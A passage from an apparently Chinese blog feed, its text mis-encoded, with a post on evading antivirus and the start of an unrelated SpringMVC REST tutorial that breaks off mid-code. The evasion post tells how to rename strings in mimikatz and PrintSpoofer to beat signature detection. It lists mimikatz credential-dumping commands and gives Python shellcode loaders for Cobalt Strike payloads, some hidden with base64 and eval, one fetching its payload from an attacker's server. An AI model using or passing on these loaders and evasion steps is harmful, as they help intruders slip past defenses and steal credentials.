        <content type="html"><![CDATA[<h2 id="mimikatzå…æ€"><a href="#mimikatzå…æ€" class="headerlink" title="mimikatzå…æ€"></a>mimikatzå…æ€</h2><p>mimikatzå¯ä»¥ä»å†…å­˜ä¸­æå–æ˜æ–‡å¯†ç ã€å“ˆå¸Œã€PIN ç å’Œ kerberos ç¥¨è¯ã€‚ mimikatz è¿˜å¯ä»¥æ‰§è¡Œå“ˆå¸Œä¼ é€’ã€ç¥¨è¯ä¼ é€’æˆ–æ„å»ºé»„é‡‘ç¥¨è¯ã€‚</p><ul><li><p>åœ¨githubä¸Šä¸‹è½½mimikatz <a href="https://github.com/gentilkiwi/mimikatz">GitHub - gentilkiwi/mimikatz: A little tool to play with Windows security</a></p></li><li><p>è§£å‹ç¼©ï¼Œæ‰“å¼€<img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153343693.png"></p></li><li><p>é»˜è®¤ç”Ÿæˆä¸æˆåŠŸï¼Œè¦æ”¹é…ç½®å±æ€§<img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153646914.png" alt="image-20220405153646914"></p><ol><li><p>å³å‡»è§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨ï¼Œç‚¹å‡»å±æ€§</p><p><img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153824349.png"></p></li><li><p>æ›´æ”¹å¹³å°ï¼Œé€‰æ‹©è‡ªå·±çš„vså¹³å°</p></li></ol><p><img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405153849889-16491443366361.png"></p><p>â€‹    3.  C++å¸¸è§„ï¼Œå°†è­¦å‘Šè§†ä¸ºé”™è¯¯è®¾ç½®ä¸ºå¦</p><p>â€‹        <img src="image-20220405154005916.png"></p><p>â€‹    </p><blockquote><p>å¯èƒ½ç¼ºå°‘MFSåº“ï¼Œè‡ªå·±å®‰è£…ä¸€ä¸‹</p></blockquote><ol start="4"><li><p>ç”Ÿæˆ</p></li><li><p>é»˜è®¤ç”Ÿæˆ32ä½ï¼Œæ”¹æˆ64ä½</p><ul><li><p>å³å‡»è§£å†³æ–¹æ¡ˆï¼Œæ‰“å¼€å±æ€§é¡µï¼Œæ”¹ä¸º64ä½ï¼Œå†ç”Ÿæˆä¸€ä¸‹</p><img src="image-20220405161938248.png" style="zoom:80%;"></li></ul></li></ol></li></ul><ol start="6"><li><p>æ‰¾åˆ°ä½ç½®ï¼Œå³å¯è·å¾—exeæ–‡ä»¶</p><p><img src="/2022/04/05/mu-ma-mian-sha-yi/image-20220405162228839.png"></p></li></ol><h4 id="å¼€å§‹å…æ€"><a href="#å¼€å§‹å…æ€" class="headerlink" title="å¼€å§‹å…æ€"></a>å¼€å§‹å…æ€</h4><ul><li>æ›¿æ¢å…³é”®å­—ï¼Œå°†mimikatzæ›¿æ¢æˆyangï¼ˆè¿™ä¸ªéšæ„ï¼‰</li></ul><blockquote><p>â€‹         åœ¨ç¨‹åºæ²¡æœ‰è¿è¡Œçš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯é€šè¿‡ç‰¹å¾ç åˆ¤æ–­çš„ã€‚è€Œä¸”Mimikatzè¿™äº›çŸ¥åå·¥å…·çš„å†…å®¹åƒmimikatzã€ä½œè€…ä¿¡æ¯ä¹‹ç±»çš„å­—ç¬¦ä¸²å°±å¾ˆå®¹æ˜“è¢«åšä¸ºç‰¹å¾ç è¯†åˆ«ã€‚</p><p>â€‹        é€šç”¨é˜…è¯»æºç å¤§ä½“å¯ä»¥äº†è§£å­˜åœ¨æ¯”è¾ƒæ˜æ˜¾çš„å…³é”®å­—ï¼šmimikatzã€MIMIKATZä»¥åŠmimikatz/mimikatz/pleasesubscribe.rcæ–‡ä»¶çš„ä¸€äº›å†…å®¹ã€‚å¯ä»¥åˆ©ç”¨Visual Studioçš„æ›¿æ¢åŠŸèƒ½å®ç°å…³é”®å­—çš„å¤„ç†ã€‚</p></blockquote><ul><li><p>åˆ é™¤æ³¨é‡Šä¿¡æ¯ï¼Œè¿™ä¹Ÿå°†æ˜¯ç‰¹å¾ç åˆ¤æ–­çš„æ ‡å‡†</p></li><li><p>ä¿®æ”¹icoå›¾æ ‡</p></li><li><p>åˆ é™¤æ•æ„Ÿä¿¡æ¯ï¼š</p><img src="1642402559246-abd76535-f8c1-4ce0-9e38-35d40363e208.png" style="zoom: 33%;"></li></ul><p>åœ¨ç©ºç™½å¤„å³é”®æ–°å¢ç‰ˆæœ¬ä¿¡æ¯ï¼š<img src="1642405305902-941bde36-5fdc-4000-bbd0-ec1a4cece27f.png" style="zoom:33%;"></p><p>æˆåŠŸä»¥åï¼Œæµ‹è¯•ä¸‹åŠŸèƒ½ï¼š</p><pre class="line-numbers language-none"><code class="language-none">privilege::debug   æå–æƒé™sekurlsa::logonpasswords   æŠ“å–å¯†ç sekurlsa::msvæå–ntlm hashå‡­è¯ã€‚sekurlsa::wdigestæå–ç”¨æˆ·å¯†ç æ˜æ–‡ã€‚sekurlsa::kerberosæå–åŸŸè´¦æˆ·å‡­è¯ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="image-20220405164234329.png"><h2 id="PrintSpooferå…æ€"><a href="#PrintSpooferå…æ€" class="headerlink" title="PrintSpooferå…æ€"></a>PrintSpooferå…æ€</h2><p>ä¸‹è½½PrintSpooferï¼š<a href="https://github.com/whojeff/PrintSpoofer">GitHub - whojeff/PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019 æœ¬åœ°ææƒ2012-2019</a></p><p>å¯ä»¥ç›´æ¥ç¼–è¯‘æˆåŠŸ</p><p>å…æ€æ€è·¯ï¼ˆå’Œmimikatzå·®ä¸å¤šï¼‰</p><p>1ã€å°†PrintSpoofer.cpp é‡Œé¢çš„è¾“å‡ºå¸®åŠ©æ–‡æ¡£å…¨éƒ¨æ¸…ç©º</p><img src="image-20220405165814177.png" style="zoom:80%;"><p>2ã€å°†é¡¹ç›®ä¸­æœç´¢PrintSpooferæ›¿æ¢ä¸ºå…¶ä»–å†…å®¹ï¼Œè¿™é‡Œæ”¹æˆyangã€‚</p><p>3ã€ç„¶åå°†PrintSpoofer.cpp PrintSpoofer.h å…¨æ”¹ä¸ºå…¶ä»–åå­— è¿™é‡Œæ”¹æˆyang</p><p>4ã€æ·»åŠ icoå›¾æ ‡å³å¯ã€‚</p><h2 id="Python3CSshellcodeå…æ€"><a href="#Python3CSshellcodeå…æ€" class="headerlink" title="Python3CSshellcodeå…æ€"></a>Python3CSshellcodeå…æ€</h2><h4 id="ä»€ä¹ˆæ˜¯shellcode"><a href="#ä»€ä¹ˆæ˜¯shellcode" class="headerlink" title="ä»€ä¹ˆæ˜¯shellcode"></a><strong>ä»€ä¹ˆæ˜¯shellcode</strong></h4><p>åœ¨é»‘å®¢æ”»å‡»ä¸­ï¼Œshellcodeæ˜¯ä¸€å°æ®µä»£ç ï¼Œç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´ä½œä¸ºæœ‰æ•ˆè½½è·ã€‚å®ƒä¹‹æ‰€ä»¥è¢«ç§°ä¸ºâ€œshellcodeâ€ï¼Œæ˜¯å› ä¸ºå®ƒé€šå¸¸å¯åŠ¨ä¸€ä¸ªå‘½ä»¤shellï¼Œæ”»å‡»è€…å¯ä»¥ä»è¿™ä¸ªå‘½ä»¤shellæ§åˆ¶å—æŸçš„è®¡ç®—æœºï¼Œä½†æ˜¯æ‰§è¡Œç±»ä¼¼ä»»åŠ¡çš„ä»»ä½•ä»£ç éƒ½å¯ä»¥è¢«ç§°ä¸ºshellcodeã€‚</p><h4 id="ä»€ä¹ˆæ˜¯shellcode-loader"><a href="#ä»€ä¹ˆæ˜¯shellcode-loader" class="headerlink" title="ä»€ä¹ˆæ˜¯shellcode loader"></a><strong>ä»€ä¹ˆæ˜¯shellcode loader</strong></h4><p>shellcode loader æ˜¯ç”¨äºåŠ è½½å’Œè¿è¡Œshellcodeçš„ä»£ç ã€‚</p><h4 id="ç”Ÿæˆæœ¨é©¬"><a href="#ç”Ÿæˆæœ¨é©¬" class="headerlink" title="ç”Ÿæˆæœ¨é©¬"></a>ç”Ÿæˆæœ¨é©¬</h4><p>ç”Ÿæˆæœ¨é©¬ï¼Œé€‰æ‹©pythonï¼Œç„¶åç”Ÿæˆpayload.pyã€‚å°†å…¶ä¸‹è½½åˆ°æœ¬æœºè¿›è¡Œä¸‹ä¸€æ­¥å…æ€</p><p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89/image-20220405182853196.png"></p><p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%EF%BC%88%E4%B8%80%EF%BC%89/image-20220405182916526.png"></p><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token comment">#shellcodeåŠ è½½</span><span class="token keyword">def</span> <span class="token function">shellCodeLoad</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">:</span>    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64    ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>RtlMoveMemory<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>WaitForSingleObject<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    shellCodeLoad<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'shellcode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>shellcodeé‡Œå¡«å……ä½ çš„payload.pyçš„ä»£ç </p><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>æœ‰çš„æ—¶å€™ä¼šå¯¹è¿™ä¸€å¥æŸ¥æ€<code>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))</code>ï¼Œå¯ä»¥ç”¨åˆ°base64ç¼–ç å¯¹å…¶è¿›è¡ŒåŠ å¯†ï¼Œä»¥å‡å°‘ç‰¹å¾ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token keyword">import</span> base64<span class="token comment">#shellcodeåŠ è½½</span><span class="token keyword">def</span> <span class="token function">shellCodeLoad</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">:</span>    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64    ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    <span class="token builtin">eval</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>WaitForSingleObject<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    shellCodeLoad<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b'shellcode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h4><p>å¦è¾Ÿè¹Šå¾„ï¼Œç›´æ¥å»ç½‘ä¸Šè¯»æ–‡ä»¶ã€‚éœ€è¦é»‘å®¢å¼€å¯httpæœåŠ¡ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token keyword">import</span> base64<span class="token comment">#shellcodeåŠ è½½</span><span class="token keyword">def</span> <span class="token function">shellCodeLoad</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">:</span>    ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64    ptr <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>VirtualAlloc<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    buf <span class="token operator">=</span> <span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>from_buffer<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    <span class="token builtin">eval</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    handle <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>CreateThread<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_int<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token builtin">eval</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLCBjdHlwZXMuY19pbnQoLTEpKQ=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>req<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'IP/xxx.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># å»é»‘å®¢ä¸»æœºè¯»payloadæ–‡ä»¶</span>    shellCodeLoad<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> æœ¨é©¬å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVCï¼ˆäºŒï¼‰</title>
      <link href="/2022/04/05/springmvc-er/"/>
      <url>/2022/04/05/springmvc-er/</url>
      
        <content type="html"><![CDATA[<h2 id="RESTé£æ ¼"><a href="#RESTé£æ ¼" class="headerlink" title="RESTé£æ ¼"></a>RESTé£æ ¼</h2><h4 id="RESTï¼ˆRepresentational-State-Transferï¼‰ï¼Œè¡¨ç°å½¢å¼çŠ¶æ€è½¬æ¢"><a href="#RESTï¼ˆRepresentational-State-Transferï¼‰ï¼Œè¡¨ç°å½¢å¼çŠ¶æ€è½¬æ¢" class="headerlink" title="RESTï¼ˆRepresentational State Transferï¼‰ï¼Œè¡¨ç°å½¢å¼çŠ¶æ€è½¬æ¢"></a>RESTï¼ˆRepresentational State Transferï¼‰ï¼Œè¡¨ç°å½¢å¼çŠ¶æ€è½¬æ¢</h4><ul><li><p>ä¼ ç»Ÿé£æ ¼èµ„æºæè¿°å½¢å¼<br><code>http://localhost/user/getById?id=1</code><br><code>http://localhost/user/saveUser</code></p></li><li><p>RESTé£æ ¼æè¿°å½¢å¼<br><code>http://localhost/user/1</code><br><code>http://localhost/user</code></p></li></ul><p>ä¼˜ç‚¹ï¼š</p><blockquote><p>éšè—èµ„æºçš„è®¿é—®è¡Œä¸ºï¼Œæ— æ³•é€šè¿‡åœ°å€å¾—çŸ¥å¯¹èµ„æºæ˜¯ä½•ç§æ“ä½œã€‚<br>ä¹¦å†™ç®€åŒ–ã€‚</p></blockquote><p>æŒ‰ç…§RESTé£æ ¼è®¿é—®èµ„æºæ—¶ä½¿ç”¨è¡Œä¸ºåŠ¨ä½œåŒºåˆ†å¯¹èµ„æºè¿›è¡Œäº†ä½•ç§æ“ä½œ</p><p>æ ¹æ®RESTé£æ ¼å¯¹èµ„æºè¿›è¡Œè®¿é—®ç§°ä¸ºRESTful</p><blockquote><p>GETæ–¹å¼è¯·æ±‚ä»£è¡¨ï¼ˆæŸ¥è¯¢ï¼‰<br>POSTæ–¹å¼è¯·æ±‚ä»£è¡¨ï¼ˆæ–°å¢/ä¿å­˜ï¼‰<br>PUTæ–¹å¼è¯·æ±‚ä»£è¡¨ï¼ˆä¿®æ”¹/æ›´æ–°ï¼‰<br>DELETEæ–¹å¼è¯·æ±‚ä»£è¡¨ï¼ˆåˆ é™¤ï¼‰</p></blockquote><p><strong>ä¸Šè¿°è¡Œä¸ºæ˜¯çº¦å®šæ–¹å¼ï¼Œçº¦å®šä¸æ˜¯è§„èŒƒï¼Œå¯ä»¥æ‰“ç ´ï¼Œæ‰€ä»¥ç§°RESTé£æ ¼ï¼Œè€Œä¸æ˜¯RESTè§„èŒƒ</strong></p><h4 id="å…¥é—¨æ¡ˆä¾‹"><a href="#å…¥é—¨æ¡ˆä¾‹" class="headerlink" title="å…¥é—¨æ¡ˆä¾‹"></a>å…¥é—¨æ¡ˆä¾‹</h4><p>åªéœ€è¦ä¿®æ”¹ä¸Šä¸€ä¸ªé¡¹ç›®ã€‚</p><p>åœ¨Controllerä¸­å®šä¹‰æ–¹æ³•æ—¶è®¾å®šâ€httpè¯·æ±‚åŠ¨ä½œ(è¯·æ±‚æ–¹å¼)â€å’Œâ€è®¾å®šè¯·æ±‚å‚æ•°ï¼ˆè·¯å¾„å˜é‡ï¼‰â€</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">{</span>    <span class="token comment">//è®¾ç½®å½“å‰è¯·æ±‚æ–¹æ³•ä¸ºPOSTï¼Œè¡¨ç¤ºRESTé£æ ¼ä¸­çš„æ·»åŠ æ“ä½œ</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>POST<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user save..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'user save'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//è®¾ç½®å½“å‰è¯·æ±‚æ–¹æ³•ä¸ºDELETEï¼Œè¡¨ç¤ºRESTé£æ ¼ä¸­çš„åˆ é™¤æ“ä½œ</span>    <span class="token comment">//@PathVariableæ³¨è§£ç”¨äºè®¾ç½®è·¯å¾„å˜é‡ï¼ˆè·¯å¾„å‚æ•°ï¼‰ï¼Œè¦æ±‚è·¯å¾„ä¸Šè®¾ç½®å¯¹åº”çš„å ä½ç¬¦ï¼Œå¹¶ä¸”å ä½ç¬¦åç§°ä¸æ–¹æ³•å½¢å‚åç§°ç›¸åŒ</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users/{id}"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>DELETE<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user delete..."</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"{'module':'user delete'}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//è®¾ç½®å½“å‰è¯·æ±‚æ–¹æ³•ä¸ºPUTï¼Œè¡¨ç¤ºRESTé£æ ¼ä¸­çš„ä¿®æ”¹æ“ä½œ</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users"</span><span class="token punctuation">,</span>method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>PUT<span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token 